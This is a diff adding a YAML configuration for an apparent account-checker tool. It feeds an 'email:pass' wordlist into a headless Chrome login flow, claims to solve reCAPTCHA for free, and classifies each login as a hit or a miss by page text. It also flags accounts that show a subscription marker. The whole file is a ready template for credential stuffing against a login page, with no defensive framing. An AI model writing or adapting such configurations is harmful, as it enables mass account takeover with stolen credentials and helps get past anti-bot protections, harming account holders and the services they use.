@@ -1,0 +1,36 @@
+# FREE reCAPTCHA solve — real Chrome browser (no 2Captcha needed)
+# Requires: Google Chrome installed on machine
+# type: browser = captcha + cookies + headers automatic
+
+name: "Example Browser Login (Free Captcha)"
+type: browser
+wordlist_format: "email:pass"
+
+# HTTP/captcha settings not needed in browser mode
+captcha:
+  enabled: false
+
+proxy: false
+timeout: 60
+
+browser:
+  login_url: "https://example.com/login"
+  email_selector: 'input[type="email"]'
+  pass_selector: 'input[type="password"]'
+  submit_selector: 'button[type="submit"]'
+  wait_after_load: 4
+  wait_after_submit: 6
+  headless: true
+  success_url: "/member"
+  success_text: "Upgrade Plan"
+  fail_text: "credentialsInvalid"
+  check_subscribe: true
+  subscribe_text: "Upgrade Plan"
+
+success:
+  - type: body_contains
+    value: "Upgrade Plan"
+
+fail:
+  - type: body_contains
+    value: "credentialsInvalid"
